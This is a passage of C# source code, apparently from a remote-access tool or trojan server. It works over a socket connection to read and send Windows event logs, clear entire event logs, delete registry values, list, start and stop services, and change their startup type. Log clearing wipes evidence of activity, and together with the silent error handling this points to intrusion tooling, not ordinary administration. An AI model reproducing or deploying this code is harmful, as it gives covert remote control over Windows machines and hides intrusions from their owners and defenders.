                            GlobalReg = Registry.CurrentConfig.OpenSubKey(TheKey, true);
                            break;

                        case "HKEY_USERS":
                            GlobalReg = Registry.Users.OpenSubKey(TheKey, true);
                            break;
                    }
                    GlobalReg.DeleteValue(s[0]);
                }
                catch { }
            }
        }
        private void GetEventlogList(string str)
        {
            EventLogEntryCollection eventCollection;
            EventLog systemEvent;
            systemEvent = new EventLog();
            systemEvent.Log = str;
            eventCollection = systemEvent.Entries;
            int length = eventCollection.Count; ;
            for (int i = length - 1; i >= 0; --i)
            {
                EventLogEntry entry = eventCollection[i];
                Write(ref socket, entry.EntryType.ToString() + "\t" + entry.TimeGenerated.ToLongDateString() + "\t" + entry.TimeGenerated.ToLongTimeString() + "\t" + entry.Source + "\t" + entry.Category + "\t" + entry.EventID.ToString() + "\t" + entry.UserName + "\t" + entry.MachineName + "\t" + entry.Message + "\b");
            }          
        }
        private void DelEventlog(string str)
        {
            EventLog systemEvent;
            systemEvent = new EventLog();
            systemEvent.Log = str;
            systemEvent.Clear();
        }
        private void GetServiceList()
        {
            string TempMachineName = System.Environment.MachineName;
            ServiceController[] ArraySrvCtrl = ServiceController.GetServices(TempMachineName);
            foreach (ServiceController tempSC in ArraySrvCtrl)
            {
                RegistryKey reg = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\" + tempSC.ServiceName);
                string str1 = null;
                string str2 = null;
                try
                {
                    str1 = reg.GetValue("Description").ToString();
                    str2 = reg.GetValue("Start").ToString();
                }
                catch { }
                Write(ref socket, tempSC.DisplayName + "\t" + str1 + "\t" + tempSC.Status + "\t" + str2 + "\t" + tempSC.MachineName + "\t" + tempSC.ServiceName + "\b");
            }
        }
        private void StartService(string str)
        {
            ServiceController tempSC = new ServiceController(str);
            try
            {
                tempSC.Start();
            }
            catch { }
        }
        private void StopService(string str)
        {
            ServiceController tempSC = new ServiceController(str);
            try
            {
                tempSC.Stop();
            }
            catch { }
        }
        private void AutoStartService(string str)
        {
            string[] s = str.Split('\t');
            ServiceController tempSC = new ServiceController(s[0]);
            RegistryKey reg = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\" + tempSC.ServiceName, true);
            try
            {
                reg.SetValue("Start", int.Parse(s[1]));
            }
            catch { }
        }
    }
}